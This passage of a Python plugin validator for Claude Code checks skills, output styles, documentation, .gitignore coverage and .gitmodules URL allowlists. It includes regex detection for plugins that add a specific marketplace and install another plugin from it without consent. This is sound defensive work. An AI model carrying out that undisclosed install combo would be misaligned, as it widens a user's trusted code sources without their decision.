            report.info("Root-level SKILL.md found — surfaced as a skill (CC v2.1.142)")
            # The skill's directory IS the plugin root, so the frontmatter
            # 'name' has no skills/<name>/ folder to be matched against.
            skill_report = validate_skill_comprehensive(
                plugin_root,
                # Nixtla strict mode is a quality opinion, not Anthropic-validity —
                # see the matching call below; do not block valid skills on it.
                strict_mode=False,
                strict_openspec=False,
                validate_pillars_flag=False,
                skip_platform_checks=skip_platform_checks,
                skip_dir_name_check=True,
            )
            for result in skill_report.results:
                report.add(result.level, result.message, result.file or "SKILL.md", result.line)
        else:
            report.info("No skills/ directory found")
        return

    # A skills/ directory exists: per CC v2.1.142 a root-level SKILL.md is
    # surfaced ONLY when the plugin has no skills/ subdir, so a SKILL.md left
    # at the plugin root alongside skills/ is dead weight that never loads.
    if root_skill_md.is_file():
        report.minor(
            "Root-level SKILL.md will NOT load: CC v2.1.142 surfaces a "
            "root-level SKILL.md as a skill only when the plugin has no "
            "skills/ subdirectory. Move it to skills/<name>/SKILL.md, or "
            "remove the skills/ directory so the root-level SKILL.md is "
            "surfaced instead.",
            "SKILL.md",
        )

    # Find all skill directories
    skill_dirs = [d for d in skills_dir.iterdir() if d.is_dir()]

    if not skill_dirs:
        report.info("No skill directories found in skills/")
        return

    report.info(f"Found {len(skill_dirs)} skill(s) to validate")

    # Validate each skill using comprehensive validator (190+ rules)
    for skill_dir in sorted(skill_dirs):
        skill_name = skill_dir.name
        # Use comprehensive validator with all checks enabled
        skill_report = validate_skill_comprehensive(
            skill_dir,
            # Nixtla "strict mode" (required sections, first/second-person voice)
            # is an enterprise QUALITY standard, NOT Anthropic-validity — a minimal
            # Anthropic-valid skill (name + description + body) has none of those
            # sections yet is perfectly loadable. Imposing strict mode as BLOCKING
            # on every plugin's skills produced ~8 false MAJORs on a valid minimal
            # skill (TRDD-021250b5 severity principle). Strict mode stays opt-in via
            # the standalone `validate_skill --strict`.
            strict_mode=False,
            strict_openspec=False,  # Don't require OpenSpec 6-field whitelist for plugins
            validate_pillars_flag=skill_name.startswith(("lang-", "convert-")),  # Auto-enable for lang-*/convert-*
            skip_platform_checks=skip_platform_checks,
        )

        # Transfer results to main report with skill path prefix
        for result in skill_report.results:
            file_path = f"skills/{skill_name}/{result.file}" if result.file else f"skills/{skill_name}"
            report.add(result.level, result.message, file_path, result.line)


def validate_output_styles(plugin_root: Path, report: ValidationReport) -> None:
    """Validate output-styles/ directory — markdown files with YAML frontmatter.

    Output style files have frontmatter fields:
    - name (string, optional — defaults to filename)
    - description (string, optional — shown in /config picker)
    - keep-coding-instructions (boolean, optional — default false)
    """
    styles_dir = plugin_root / "output-styles"
    if not styles_dir.is_dir():
        return

    md_files = list(styles_dir.glob("*.md"))
    if not md_files:
        report.info("output-styles/ directory exists but has no .md files")
        return

    valid_fields = {"name", "description", "keep-coding-instructions"}

    for md_file in md_files:
        try:
            content = md_file.read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError) as e:
            report.major(f"Cannot read output style: {e}", f"output-styles/{md_file.name}")
            continue

        # Parse frontmatter
        if not content.startswith("---"):
            report.minor(
                f"Output style '{md_file.name}' has no YAML frontmatter",
                f"output-styles/{md_file.name}",
            )
            continue

        parts = content.split("---", 2)
        if len(parts) < 3:
            report.minor(
                f"Output style '{md_file.name}' has malformed frontmatter (missing closing ---)",
                f"output-styles/{md_file.name}",
            )
            continue

        try:
            fm = yaml.safe_load(parts[1])
        except yaml.YAMLError as e:
            report.major(
                f"Output style '{md_file.name}' has invalid YAML: {e}",
                f"output-styles/{md_file.name}",
            )
            continue

        # If frontmatter exists but is not a mapping (e.g. a bare string or a
        # list), the file is malformed. Report it as a MAJOR finding before
        # normalizing to {} so downstream field checks don't spuriously claim
        # success on garbage frontmatter.
        if fm is not None and not isinstance(fm, dict):
            report.major(
                f"Output style '{md_file.name}': frontmatter must be a YAML mapping, got {type(fm).__name__}",
                f"output-styles/{md_file.name}",
            )
            fm = {}
        elif not isinstance(fm, dict):
            fm = {}

        # Validate fields
        for key in fm:
            if key not in valid_fields:
                report.warning(
                    f"Output style '{md_file.name}' has unknown field '{key}'",
                    f"output-styles/{md_file.name}",
                )

        if "keep-coding-instructions" in fm:
            val = fm["keep-coding-instructions"]
            if not isinstance(val, bool):
                report.major(
                    f"Output style '{md_file.name}': 'keep-coding-instructions' must be boolean, got {type(val).__name__}",
                    f"output-styles/{md_file.name}",
                )

        # Check body content exists
        body = parts[2].strip() if len(parts) > 2 else ""
        if not body:
            report.minor(
                f"Output style '{md_file.name}' has no body content (instructions)",
                f"output-styles/{md_file.name}",
            )
        else:
            report.passed(f"Output style '{md_file.name}' is valid", f"output-styles/{md_file.name}")

    report.passed(f"output-styles/: {len(md_files)} style(s) found")


def validate_readme(plugin_root: Path, report: ValidationReport) -> None:
    """Validate README and all documentation — delegates to validate_documentation().

    `validate_documentation` (validate_documentation.py) is the single source of
    truth for the 13 documentation rules (README existence at WARNING — advisory,
    non-blocking, per the TRDD-021250b5 recalibration; installation/usage/
    description sections, broken links, image refs, CHANGELOG, heading hierarchy,
    code-fence closure + language tags, list/table structure). It OWNS the
    README-existence finding, so the old inline existence check is removed. The
    badge-marker check below is NOT part of validate_documentation and is
    preserved here.
    """
    doc_report = validate_documentation_full(plugin_root)
    for result in doc_report.results:
        report.add(result.level, result.message, result.file, result.line)

    readme = plugin_root / "README.md"

    # Badge markers for automated badge updates (v2.26.0 — narrowed).
    #
    # Only fire the WARNING when the README ALREADY contains literal badge
    # markdown and lacks the automation markers. If the README has no
    # badges at all, the markers are unnecessary — nothing to regenerate.
    # This removes a false-positive WARNING from minimal READMEs and keeps
    # the check focused on its real purpose: flagging badges that cannot
    # be auto-updated by CI.
    if readme.exists():
        readme_content = readme.read_text(encoding="utf-8", errors="replace")
        has_markers = "<!--BADGES-START-->" in readme_content and "<!--BADGES-END-->" in readme_content
        # Detect literal markdown badges. Two common forms:
        # - Image-link form: [![alt](img)](href)
        # - Plain image form followed by shields.io/badge URL
        has_image_link_badge = bool(re.search(r"\[!\[[^\]]*\]\([^)]+\)\]\([^)]+\)", readme_content))
        has_shields_url = "shields.io" in readme_content or "img.shields.io" in readme_content
        has_badges = has_image_link_badge or has_shields_url
        if has_markers:
            report.passed("README.md has badge markers for automated updates", "README.md")
        elif has_badges:
            report.warning(
                "README.md has badge markdown but is missing the automation "
                "markers (<!--BADGES-START--> / <!--BADGES-END-->). CI cannot "
                "regenerate badges without the markers — wrap the badge block "
                "with those HTML comments so `scripts/update_badges.py` (or "
                "equivalent) can refresh versions/CI status automatically.",
                "README.md",
            )
        # else: no badges, no markers — nothing to flag. Silent pass.


def validate_license(plugin_root: Path, report: ValidationReport) -> None:
    """Validate LICENSE file exists."""
    for license_name in ["LICENSE", "LICENSE.md", "LICENSE.txt"]:
        if (plugin_root / license_name).exists():
            report.passed(f"{license_name} found")
            return

    report.minor("No LICENSE file found")


def validate_rules(plugin_root: Path, report: ValidationReport) -> None:
    """Validate rule files in the plugin's rules/ directory.

    Rules are plain markdown files loaded alongside CLAUDE.md into model context.
    Checks: UTF-8 encoding, optional frontmatter (paths field), token budget.
    """
    rules_dir = plugin_root / "rules"

    if not rules_dir.is_dir():
        report.info("No rules/ directory found")
        return

    # Use the dedicated rules validator
    rules_report = validate_rules_directory(rules_dir, plugin_root=plugin_root)

    # Transfer results to main report
    for result in rules_report.results:
        report.add(result.level, result.message, result.file, result.line)


def validate_no_local_paths(plugin_root: Path, report: ValidationReport) -> None:
    """Validate that plugin files don't contain hardcoded local or absolute paths.

    Uses the stricter absolute path validation from cpv_validation_common.py.

    In plugins, ALL paths should be:
    - Relative to plugin root (e.g., ./scripts/foo.py)
    - Using ${CLAUDE_PLUGIN_ROOT} for runtime resolution
    - Using ${HOME} or ~ for user home directory

    Checks for:
    - Current user's home path (CRITICAL) - auto-detected from system
    - Any absolute home directory paths (MAJOR)

    Excludes:
    - Cache directories (.mypy_cache, .ruff_cache, __pycache__)
    - Development folders (docs_dev/, scripts_dev/, etc.)
    - .git/ directory
    - Allowed system paths (/tmp/, /dev/, /proc/, /sys/)
    - Generic example usernames in documentation
    - Test directories (tests/) — contain intentional test fixture paths
    """
    # Use the strict absolute path validator which checks for:
    # - Current user's username (auto-detected) - CRITICAL
    # - ANY absolute paths that don't use env vars - MAJOR
    # We pass our local report since both have compatible interfaces
    validate_no_absolute_paths(plugin_root, report, skip_dirs={"tests"})  # type: ignore[arg-type]


# =============================================================================
# .gitignore Validation
# =============================================================================

# Patterns that a well-formed plugin .gitignore should include
# Each tuple: (pattern_to_search_for, description, severity)
# We check if the gitignore content covers these categories
EXPECTED_GITIGNORE_CATEGORIES: list[tuple[list[str], str, str]] = [
    # Cache/build artifacts
    (["__pycache__", "*.pyc"], "Python cache files (__pycache__ or *.pyc)", "warning"),
    (["node_modules"], "Node modules (node_modules/)", "warning"),
    ([".mypy_cache", ".ruff_cache", ".pytest_cache"], "Linter/type checker caches", "warning"),
    (["dist", "build", "*.egg-info"], "Build artifacts (dist/, build/, *.egg-info)", "warning"),
    # Temp/editor files
    ([".DS_Store", "Thumbs.db"], "OS metadata files (.DS_Store, Thumbs.db)", "warning"),
    (["*.swp", "*.swo", "*~", ".idea", ".vscode"], "Editor temp files", "warning"),
    # Environment/secrets
    ([".env", "*.env"], "Environment files (.env)", "major"),
    # Virtual environments
    ([".venv", "venv"], "Virtual environment directories", "major"),
    # Claude Code runtime directories
    ([".claude"], "Claude Code cache directory (.claude/)", "minor"),
    (["llm_externalizer_output"], "LLM Externalizer output directory", "warning"),
    ([".tldr"], "TLDR cache directory (.tldr/)", "warning"),
    # Agent/script reports — per ~/.claude/rules/agent-reports-location.md,
    # every plugin MUST have both `reports/` and `reports_dev/` explicitly
    # gitignored. Reports routinely contain private data (absolute paths,
    # source snippets, auth tokens in logs, PII in test fixtures), so both
    # entries MUST be present even if the folders do not yet exist — this
    # is defensive intent, not a filesystem reflection. The trailing slash
    # in each pattern disambiguates `reports/` from `reports_dev/` under
    # the validator's substring-match logic (line 2673). Added v2.25.0.
    (["reports/"], "Agent/script reports (reports/)", "major"),
    (["reports_dev/"], "Dev-only report scratch (reports_dev/)", "warning"),
]


# ── Plugin-wide unauthorized-install detection (v2.116.1, GitHub issue #64) ──
# Authorized-install model (maintainer spec): ADDING a marketplace to Claude
# Code IS the user's trust decision, so installing a SPECIFIC plugin from an
# already-trusted marketplace is authorized and must NOT be flagged. The
# UNAUTHORIZED pattern is a plugin that — anywhere across its OWN files
# (scripts, skills, hooks, instructions; possibly SPLIT across files to evade a
# per-file scan) — BOTH (a) adds a SPECIFIC marketplace AND (b) installs a
# SPECIFIC plugin. That combination expands the user's trusted-source set
# without an explicit user decision. Universal / templated procedures (a generic
# installer using ${VARS} / <placeholders>, naming no concrete marketplace +
# plugin) are NOT a security issue. POTENTIAL finding (MAJOR) — not proof of
# malice; the reviewer checks context and scans the target plugin.
_MKT_ADD_RE = re.compile(r"\bclaude\s+plugin\s+marketplace\s+add\s+([^\s;&|]+)")
_PLUGIN_INSTALL_RE = re.compile(r"\bclaude\s+plugin\s+install\s+([^\s;&|]+)")
_INSTALL_SCAN_EXTS = {".sh", ".bash", ".zsh", ".py", ".js", ".mjs", ".cjs", ".ts", ".md", ".markdown", ".json", ".txt"}
_INSTALL_SCAN_SKIP_DIRS = {
    "__pycache__", "node_modules", "dist", "build", "target", ".git", ".eggs", ".venv",
    # test/fixture trees are dev-only — never loaded/executed by the harness at
    # runtime, and routinely contain example install commands as test data.
    "tests", "test", "__tests__", "fixtures",
}
_INSTALL_REF_PLACEHOLDERS = {
    "NAME",
    "PLUGIN",
    "MARKETPLACE",
    "URL",
    "PATH",
    "PLUGIN_NAME",
    "MARKETPLACE_NAME",
    "REPO",
    "OWNER/REPO",
    "DIR",
    "PLUGIN@MARKETPLACE",
    "MY-PLUGIN",
    "MY-MARKETPLACE",
}


def _install_ref_is_specific(ref: str) -> bool:
    """True iff ``ref`` names a CONCRETE marketplace/plugin — not a shell
    variable, a ``<placeholder>``, a flag, a filesystem-path placeholder, or a
    documentation EXAMPLE token (``my-plugin``, ``owner/x``, ``foo``,
    ``my-plugin@my-plugin``). A templated / universal / illustrative installer
    is not a security issue; only a concrete marketplace+plugin pair is."""
    ref = ref.strip().strip("\"'`")
    if not ref or ref.startswith("-"):
        return False
    # shell/template variable or angle/brace placeholder → universal
    if any(ch in ref for ch in ("$", "<", ">", "{", "}", "%", "*")):
        return False
    if ref in {".", "./", "..", "...", "…"}:
        return False
    if ref.upper() in _INSTALL_REF_PLACEHOLDERS:
        return False
    ref_l = ref.lower()
    # filesystem-path placeholders (`/absolute/path/to/...`, `path/to/x`, `~/...`)
    if "path/to" in ref_l or ref_l.startswith(("/absolute", "/path", "~/", "./", "../")):
        return False
    # `owner/...` is the canonical docs placeholder for "your GitHub owner"
    if ref_l.startswith("owner/"):
        return False
    # self-referential template like `my-plugin@my-plugin` / `lint-checker@lint-checker`
    if "@" in ref:
        left, right = ref.split("@", 1)
        if left and left == right:
            return False
    # the bare plugin/marketplace NAME (after stripping @marketplace and owner/)
    name_part = ref_l.split("@", 1)[0].rsplit("/", 1)[-1]
    _EXAMPLE_PREFIXES = ("my-", "your-", "some-", "sample-", "example", "test-", "demo-", "placeholder", "foo", "bar", "baz")
    if name_part.startswith(_EXAMPLE_PREFIXES):
        return False
    if name_part in {"foo", "bar", "baz", "example", "plugin", "name", "tool", "marketplace"}:
        return False
    return True


def _own_plugin_name(plugin_root: Path) -> str:
    """This plugin's own `name` from .claude-plugin/plugin.json (or "")."""
    try:
        data = json.loads((plugin_root / ".claude-plugin" / "plugin.json").read_text(encoding="utf-8"))
        name = data.get("name", "")
        return name.strip() if isinstance(name, str) else ""
    except (OSError, ValueError):
        return ""


def _combo_path_is_autonomous(rel: str) -> bool:
    """True iff ``rel`` is a surface where a marketplace-add/plugin-install runs
    AUTONOMOUSLY — executable code (.sh/.py/.js/.mjs/.cjs/.ts), a hooks/MCP config
    command, or an AGENT-LOADED instruction file (SKILL.md, CLAUDE.md, AGENTS.md,
    or anything under agents/ commands/ output-styles/ .claude/rules/). Human-read
    DOCUMENTATION (README, CHANGELOG, design/, references/, docs/, examples/, and
    any other loose .md) is excluded: an install command there is an example or a
    user-run install guide, not autonomous execution, so it must not pair into the
    combo. This is the same instruction-loadable-vs-documentation split the
    skillaudit classifier uses."""
    rl = rel.replace("\\", "/").lower()
    segs = rl.split("/")
    base = segs[-1]
    ext = ("." + base.rsplit(".", 1)[-1]) if "." in base else ""
    if ext in {".sh", ".bash", ".zsh", ".py", ".js", ".mjs", ".cjs", ".ts"}:
        return True
    if base == "hooks.json" or base.endswith(".mcp.json"):
        return True
    if ext in {".md", ".markdown"}:
        if base in {"skill.md", "claude.md", "agents.md"}:
            return True
        if any(s in segs for s in ("agents", "commands", "output-styles")):
            return True
        if "rules" in segs and ".claude" in segs:
            return True
        return False  # README / design/ / references/ / docs/ / loose .md → documentation
    return False


def _check_unauthorized_install_combo(plugin_root: Path, report: ValidationReport) -> None:
    """Flag the plugin-wide marketplace-add + plugin-install combo (see block
    comment above). Fires only when BOTH a specific marketplace-add AND a
    specific plugin-install of a DIFFERENT plugin exist in AUTONOMOUS surfaces
    (executable code or agent-loaded instructions) anywhere in the plugin.

    SELF-BOOTSTRAP EXEMPTION: a plugin documenting/running the install of
    ITSELF (`claude plugin install <this-plugin>@<mkt>` next to
    `marketplace add <mkt>`) is the canonical, benign first-install path — the
    user runs it and thereby makes the trust decision. Only installing a
    DIFFERENT plugin is the trust-expansion case this rule targets."""
    own_name = _own_plugin_name(plugin_root)
    mkt_adds: list[tuple[str, int, str]] = []
    plugin_installs: list[tuple[str, int, str]] = []
    for dirpath, dirnames, filenames in os.walk(plugin_root):
        dirnames[:] = [
            d for d in dirnames if d not in _INSTALL_SCAN_SKIP_DIRS and not _is_python_venv(Path(dirpath) / d)
        ]
        for fn in filenames:
            if Path(fn).suffix.lower() not in _INSTALL_SCAN_EXTS:
                continue
            p = Path(dirpath) / fn
            rel = str(p.relative_to(plugin_root))
            if not _combo_path_is_autonomous(rel):
                continue
            try:
                text = p.read_text(encoding="utf-8", errors="replace")
            except OSError:
                continue
            for i, line in enumerate(text.splitlines(), 1):
                for m in _MKT_ADD_RE.finditer(line):
                    if _install_ref_is_specific(m.group(1)):
                        mkt_adds.append((rel, i, m.group(1).strip("\"'`")))
                for m in _PLUGIN_INSTALL_RE.finditer(line):
                    ref = m.group(1).strip("\"'`")
                    if not _install_ref_is_specific(ref):
                        continue
                    # Self-bootstrap exemption: installing THIS plugin (name before
                    # the optional @marketplace) is the benign first-install path.
                    installed_name = ref.split("@", 1)[0]
                    if own_name and installed_name == own_name:
                        continue
                    plugin_installs.append((rel, i, ref))
    if mkt_adds and plugin_installs:
        ma, pi = mkt_adds[0], plugin_installs[0]
        report.major(
            "Potential unauthorized install: this plugin BOTH adds a specific "
            f"marketplace (`{ma[2]}` at {ma[0]}:{ma[1]}) AND installs a specific "
            f"plugin (`{pi[2]}` at {pi[0]}:{pi[1]}). Adding a marketplace is the "
            "user's trust decision; a plugin that adds a marketplace AND installs "
            "from it expands the trusted-source set without explicit user consent "
            "(the two steps may be split across files to evade per-file scanning). "
            "This is a POTENTIAL issue, NOT proof of malice — review the context "
            "and SCAN the target plugin before trusting it. If your plugin only "
            "needs an already-trusted marketplace, drop the `marketplace add`; if "
            "it is a generic installer, use templated names (no specific "
            "marketplace+plugin pair).",
            f"{ma[0]}:{ma[1]}",
        )


def _check_stale_user_settings_local(report: ValidationReport) -> None:
    """Warn if ~/.claude/settings.local.json exists — it should not be at user level.

    settings.local.json only makes sense inside a project directory
    (<project>/.claude/settings.local.json). At ~/.claude/ it indicates a
    leftover from buggy tooling or running Claude Code from ~/ (invalid).
    """
    stale = Path.home() / ".claude" / "settings.local.json"
    if stale.exists():
        report.warning(
            "~/.claude/settings.local.json exists but should NOT be at user level. "
            "This file only makes sense inside project dirs (<project>/.claude/settings.local.json). "
            "Run /cpv-doctor --fix to delete it, or remove it manually.",
            "~/.claude/settings.local.json",
        )


def _category_has_matching_artifact(plugin_root: Path, patterns: list[str]) -> bool:
    """Return True iff ANY pattern in the category matches an existing
    file or directory inside the plugin.

    The gitignore-coverage check is GATED on this: we only flag missing
    coverage when the artifact actually exists in the plugin. A .gitignore
    pattern for a folder that does not exist in the plugin would be pure
    speculation — there is nothing to leak, so nothing to require.

    The gitignore bootstrap is performed lazily by agents at the point
    they are about to write a report (per
    ~/.claude/rules/agent-reports-location.md), not eagerly by CPV at
    validation time.

    Pattern matching:
    - Patterns with a trailing ``/`` are treated as directories.
    - Patterns containing ``*`` are passed through ``rglob`` (matches any
      file under the plugin tree — catches nested ``__pycache__`` etc.).
    - All other patterns are matched as either a file or a directory.
    """
    for raw in patterns:
        p = raw.strip()
        if p.endswith("/"):
            if (plugin_root / p.rstrip("/")).is_dir():
                return True
            continue
        if "*" in p:
            try:
                if next(plugin_root.rglob(p), None) is not None:
                    return True
            except OSError:
                pass
            continue
        target = plugin_root / p
        if target.is_dir() or target.is_file():
            return True
    return False


def validate_strip_gitmodules(plugin_root: Path, report: ValidationReport) -> None:
    """TRDD-793ac32a — validate `.gitmodules` URL allowlist.

    Plugins that use the strip-dev-parts pattern (tests/ → submodule)
    expose a `.gitmodules` URL surface that is normally trusted with no
    defense (PSS pattern). CPV adds:

      * URL-shape rules (no userinfo, no `..`, scheme in {https,ssh},
        no backslash/newline) → CRITICAL on violation (STRIP-G010)
      * Per-plugin allowlist via `cpv.strip.allowed_submodule_urls`
        → CRITICAL on alien URL (STRIP-G011)
      * Default rule when allowlist is absent: same owner as parent OR
        `Emasoft` (transitional shared-dev repos) → CRITICAL on alien
        owner (STRIP-G013)
      * Opt-out via `cpv.strip.require_url_allowlist=false` → WARNING
        for traceability (STRIP-G014)
      * Recorded `submodule_commit_sha` cross-check vs git index
        → CRITICAL on mismatch (STRIP-G015)

    No-op when `.gitmodules` is absent. **Fail-closed** when CPV's own
    `cpv_validate_gitmodules` module cannot be imported: emit CRITICAL
    with code RC-STRIP-GITMODULES-IMPORT-FAILED. A missing security
    validator is itself a security failure — refusing to validate is
    safer than silently passing the plugin (the engine ALSO runs the
    same check at strip time, but that is a separate execution
    path).
    """
    gm = plugin_root / ".gitmodules"
    if not gm.is_file():
        return
    try:
        import sys as _sys
        from pathlib import Path as _Path

        scripts_dir = str(_Path(__file__).resolve().parent)
        if scripts_dir not in _sys.path:
            _sys.path.insert(0, scripts_dir)
        from cpv_validate_gitmodules import validate_gitmodules  # noqa: PLC0415
    except ImportError as e:
        # Engine helper missing — security validator unavailable.
        # FAIL-CLOSED: refuse to validate rather than silently pass.
        # A missing CRITICAL-tier check on a security-sensitive surface
        # (.gitmodules URL allowlist) must NEVER degrade to a soft warning
        # — that turns a security validator into a fail-open path that
        # an attacker can exploit by deleting / shadowing the helper.
        report.critical(
            "[RC-STRIP-GITMODULES-IMPORT-FAILED] .gitmodules present but "
            "cpv_validate_gitmodules.py is not installed/importable — "
            f"refusing to validate (import error: {e}). The .gitmodules URL "
            "allowlist is a CRITICAL-tier security check (TRDD-793ac32a) "
            "and CPV must not pass plugins through it silently. Reinstall "
            "CPV from a release that ships scripts/cpv_validate_gitmodules.py, "
            "or remove .gitmodules from the plugin if no submodule is needed."
        )
        return

    findings = validate_gitmodules(plugin_root)
    for f in findings:
        msg = f"[{f.code}] submodule={f.submodule_name!r} {f.message}"
        if f.severity == "CRITICAL":
            report.critical(msg)
        elif f.severity == "WARNING":
            report.warning(msg)
        else:
            report.minor(msg)
    if not findings:
        report.passed(".gitmodules URLs pass the strip-dev-parts allowlist (TRDD-793ac32a)")


def _claude_dir_has_tracked_content(plugin_root: Path) -> bool:
    """True iff the plugin git-tracks any file under ``.claude/``.

    Issue #120: the `.claude/` cache-dir coverage check (`git check-ignore .claude`)
    is *unsatisfiable* for a plugin that deliberately tracks content under
    `.claude/` (e.g. the fleet wiki-memory corpus at
    `.claude/project/memory/**`). git cannot re-include a path whose parent
    directory is excluded (`man gitignore`), so the only gitignore that keeps
    `.claude/project/memory/` trackable is the deep form `.claude/**` +
    `!.claude/project/...`, which ignores the cache *contents* but leaves the
    bare `.claude` dir entry un-ignored → `git check-ignore .claude` exits 1 →
    a spurious MINOR that no gitignore can clear.

    Tracked content is git-authoritative proof of intent: a plugin that ships
    files under `.claude/` is not leaking a cache, so the "should be ignored"
    finding does not apply. This mirrors the existing
    `_category_has_matching_artifact` "only flag if the artifact exists"
    philosophy. Returns False (→ the check stays live) when the plugin is not a
    git repo or git is unavailable, so the genuine "un-ignored, un-tracked cache
    dir" case still fires.
    """
    try:
        result = subprocess.run(
            ["git", "ls-files", "--", ".claude/"],
            cwd=plugin_root,
            capture_output=True,
            text=True,
            timeout=15,
        )
    except (OSError, subprocess.SubprocessError):
        return False
    # `git ls-files` exits 0 with an empty stdout when nothing is tracked, and
    # exits 128 when not a git repo — both → no tracked content → keep the check.
    if result.returncode != 0:
        return False
    return bool(result.stdout.strip())


def _gitignore_covers_category(plugin_root: Path, patterns: list[str], lines: list[str]) -> bool:
    """True iff git considers a representative path of this category ignored.

    Named `_category` (not the bare `_gitignore_covers` the issue-98 report
    suggested) because `validate_gitignore` already defines a NESTED helper
    `_gitignore_covers(name, lines)` for venv-dir fnmatch coverage; reusing the
    bare name would shadow it and raise UnboundLocalError. This function is the
    category-level, git-authoritative coverage check.

    Issue #98: `EXPECTED_GITIGNORE_CATEGORIES` were matched by literal substring
    against .gitignore lines, so a glob like `*_dev/` that genuinely ignores
    `reports_dev/` was reported as "missing coverage". `git check-ignore` is
    authoritative for ALL gitignore syntax — globs, negations, directory-only
    rules, nested per-dir .gitignore files. Fall back to the legacy substring
    scan when the plugin is not a git repo or git is unavailable (graceful,
    never crashes). FN-safe: a genuinely-uncovered required path makes
    `git check-ignore -q` exit non-zero AND the substring scan miss it, so the
    WARNING still fires.
    """
    # Derive a concrete candidate path per pattern (strip trailing '/', drop
    # globs to a representative name). For a wildcard like '*.pyc' use a probe
    # filename; for 'reports_dev/' use 'reports_dev/'.
    candidates: list[str] = []
    for raw in patterns:
        p = raw.strip()
        if "*" in p:
            # turn '*.pyc' -> 'probe.pyc', '*.egg-info' -> 'probe.egg-info'
            candidates.append("__cpv_probe__" + p.replace("*", "") if p.startswith("*") else p.replace("*", "x"))
        else:
            candidates.append(p)
    try:
        # -q exits 0 if ANY listed path is ignored. Run once with all candidates.
        result = subprocess.run(
            ["git", "check-ignore", "-q", "--", *candidates],
            cwd=plugin_root,
            capture_output=True,
            timeout=15,
        )
        # git returns 128 when not a git repo / other fatal error -> fall back.
        if result.returncode in (0, 1):
            return result.returncode == 0
    except (OSError, subprocess.SubprocessError):
        pass
    # Fallback: legacy literal substring scan.
    return any(any(p.lower() in line.lower() for line in lines) for p in patterns)


def validate_gitignore(plugin_root: Path, report: ValidationReport) -> None:
    """Validate that the plugin has a .gitignore with essential patterns.

    Checks that cache files, build artifacts, temp files, secrets,
    and virtual environments are properly ignored — **but only for
    artifacts that actually exist in the plugin**. Missing coverage for
    a folder that does not exist is not a finding; the gitignore
    bootstrap rule (agent-reports-location.md) is lazy — agents add
    entries at the point they're about to write, not eagerly.
    """
    gitignore_path = plugin_root / ".gitignore"

    if not gitignore_path.exists():
        report.major(
            "No .gitignore file found — cache files, build artifacts, and secrets may be accidentally included in the plugin"
        )
        return

    try:
        content = gitignore_path.read_text(encoding="utf-8")
    except (OSError, UnicodeDecodeError) as e:
        report.minor(f"Could not read .gitignore: {e}")
        return

    # Strip comments and empty lines for pattern matching
    lines = [line.strip() for line in content.splitlines() if line.strip() and not line.strip().startswith("#")]
    missing_categories: list[tuple[str, str]] = []

    for patterns, description, severity in EXPECTED_GITIGNORE_CATEGORIES:
        # Issue #120: the `.claude/` cache-dir category is unsatisfiable when the
        # plugin deliberately tracks content under `.claude/` (no gitignore can
        # both ignore the bare `.claude` dir AND keep a tracked subtree under it).
        # Tracked content proves intent — treat the category as satisfied. Scoped
        # strictly to the `.claude` category so no other category's logic changes.
        if patterns == [".claude"] and _claude_dir_has_tracked_content(plugin_root):
            continue
        # Only flag if the gitignore misses this category AND the artifact
        # actually exists in the plugin. Don't speculate about future files.
        if _gitignore_covers_category(plugin_root, patterns, lines):
            continue
        if _category_has_matching_artifact(plugin_root, patterns):
            missing_categories.append((description, severity))

    if not missing_categories:
        report.passed(".gitignore covers all expected categories for artifacts present in the plugin")
    else:
        for description, severity in missing_categories:
            getattr(report, severity)(f".gitignore missing coverage for: {description}")

    # Check for common anti-patterns in .gitignore
    # Ignoring the entire plugin source is almost certainly wrong
    if "*.py" in lines or "*.js" in lines or "*.ts" in lines:
        report.major(
            ".gitignore ignores all source files (*.py, *.js, or *.ts) — this will exclude plugin code from distribution"
        )

    # Scan for actual venv directories by structure (any name, not just .venv/venv)
    # BUG FIX: previous substring match `dirname in line` falsely reported that a
    # venv named `venv/` was covered when the gitignore only contained `.venv/`,
    # because "venv" is a substring of ".venv". Use fnmatch against the normalised
    # pattern body so exact directory names are required (glob still supported).
    def _gitignore_covers(name: str, gitignore_lines: list[str]) -> bool:
        lower_name = name.lower()
        for raw in gitignore_lines:
            # Strip negation marker, leading slash, and trailing slash — gitignore
            # semantics: `/foo/` and `foo/` both mean "dir named foo". We don't
            # need full gitignore semantics here, just an exact/glob name check.
            pat = raw.strip()
            if pat.startswith("!"):
                pat = pat[1:]
            pat = pat.lstrip("/").rstrip("/")
            if not pat:
                continue
            if fnmatch.fnmatch(lower_name, pat.lower()):
                return True
        return False

    for item in plugin_root.iterdir():
        if item.is_dir() and _is_python_venv(item):
            dirname = item.name
            # Check if this specific directory is covered by .gitignore
            if not _gitignore_covers(dirname, lines):
                report.major(
                    f"Virtual environment '{dirname}/' detected (contains pyvenv.cfg) but not covered by .gitignore. Add '{dirname}/' to .gitignore."
                )

    # Check for bundled dependency directories that should be installed at runtime
    # in ${CLAUDE_PLUGIN_DATA} instead of shipped inside the plugin root.
    # ${CLAUDE_PLUGIN_ROOT} is wiped on every plugin update; ${CLAUDE_PLUGIN_DATA} persists.
    # Skip this check in development mode (.git present = source repo, not installed plugin).
    is_dev_mode = (plugin_root / ".git").exists()
    if not is_dev_mode:
        bundled_dep_dirs = {"node_modules", ".venv", "venv", "vendor", "__pypackages__"}
        for item in plugin_root.iterdir():
            if item.is_dir() and item.name.lower() in bundled_dep_dirs:
                report.warning(
                    f"Bundled dependency directory '{item.name}/' found inside plugin root. "
                    "This directory will be lost on every plugin update because ${{CLAUDE_PLUGIN_ROOT}} is replaced. "
                    "Use a SessionStart hook to install dependencies into ${{CLAUDE_PLUGIN_DATA}} instead — "
                    "see https://code.claude.com/docs/en/plugins-reference#persistent-data-directory",
                )

    # Check that Node.js plugins wire a SessionStart installer hook.
    # Plugins that ship `package.json`/`package-lock.json`/`pnpm-lock.yaml`/
    # `yarn.lock`/`bun.lock` need their `node_modules/` installed at
    # runtime — and the only durable place to install them is
    # ${CLAUDE_PLUGIN_DATA}, because ${CLAUDE_PLUGIN_ROOT} is wiped on
    # every plugin update.
    #
    # We narrow this advisory to Node.js because:
    #   - Python plugins typically run via `uv run`, which auto-provisions
    #     deps from pyproject.toml lazily (no SessionStart needed).
    #   - Rust/Go plugins typically `cargo build`/`go install` lazily.
    #   - Node.js is the only ecosystem where the dependency resolver
    #     refuses to run lazily — `require()` looks up `node_modules/`
    #     in the running process's directory tree, so the install MUST
    #     happen ahead of the first import.
    #
    # This rule fires in BOTH dev mode and packaged mode — the
    # missing-installer case is a design mistake, not a packaging
    # mistake, and the dev tree is the right place to catch it before
    # publish.
    node_manifests: tuple[str, ...] = (
        "package.json",
        "package-lock.json",
        "pnpm-lock.yaml",
